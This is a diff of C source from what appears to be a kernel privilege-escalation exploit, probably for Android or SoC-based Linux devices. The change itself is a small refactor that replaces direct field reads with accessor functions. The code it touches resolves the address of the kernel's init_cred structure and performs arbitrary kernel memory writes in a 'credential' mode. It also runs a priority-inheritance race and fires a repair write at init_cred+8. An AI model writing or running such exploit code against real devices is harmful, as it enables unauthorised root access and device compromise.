@@ -209,11 +209,13 @@ static int resolve_profile_addresses(void) {
         return -1;
     pr_info("soc: %s; kernel_phys_load=0x%llx\n",
             resolved_addresses_soc_name(&g_resolved_addresses, &g_target_profile),
-            (unsigned long long) g_resolved_addresses.kernel_phys_load);
+            (unsigned long long) resolved_addresses_kernel_phys_load(
+                &g_resolved_addresses));
     pr_info("init_cred image=%016zx alias=%016zx\n",
-            (size_t) g_resolved_addresses.init_cred_image,
+            (size_t) resolved_addresses_init_cred_image(&g_resolved_addresses),
             (size_t) resolved_addresses_data_alias(
-                    &g_resolved_addresses, g_resolved_addresses.init_cred_image));
+                    &g_resolved_addresses,
+                    resolved_addresses_init_cred_image(&g_resolved_addresses)));
     return 0;
 }
 
@@ -559,7 +561,8 @@ static int do_one_write(const WriteRequest *request, const char *desc) {
                 : (request->mode == WRITE_MODE_CREDENTIAL
                         ? resolved_addresses_data_alias(
                                 &g_resolved_addresses,
-                                g_resolved_addresses.init_cred_image)
+                                resolved_addresses_init_cred_image(
+                                    &g_resolved_addresses))
                         : resolved_addresses_data_alias(
                                 &g_resolved_addresses, EMPTY_ZERO_PAGE));
         int ok = kernel5_resident_write(request->target, value);
@@ -1108,7 +1111,9 @@ static int retry_write_stage(
         if (mode == 2 && kernel5_route_selected()) {
             const WriteRequest repair_request = write_request_make(
                     resolved_addresses_data_alias(
-                            &g_resolved_addresses, g_resolved_addresses.init_cred_image) + 8,
+                            &g_resolved_addresses,
+                            resolved_addresses_init_cred_image(
+                                &g_resolved_addresses)) + 8,
                     WRITE_MODE_ZERO, 1);
             page_base = prepare_good_kernel_page(&repair_request);
             if (!page_base || !stash_prebuilt_page()) {
@@ -1135,7 +1140,9 @@ static int retry_write_stage(
             }
             const WriteRequest repair_request = write_request_make(
                     resolved_addresses_data_alias(
-                            &g_resolved_addresses, g_resolved_addresses.init_cred_image) + 8,
+                            &g_resolved_addresses,
+                            resolved_addresses_init_cred_image(
+                                &g_resolved_addresses)) + 8,
                     WRITE_MODE_ZERO, 1);
             pr_info("W2b: firing prebuilt init_cred+8 repair\n");
             atomic_store(&g_pi_race_context.fast_repair, 1);
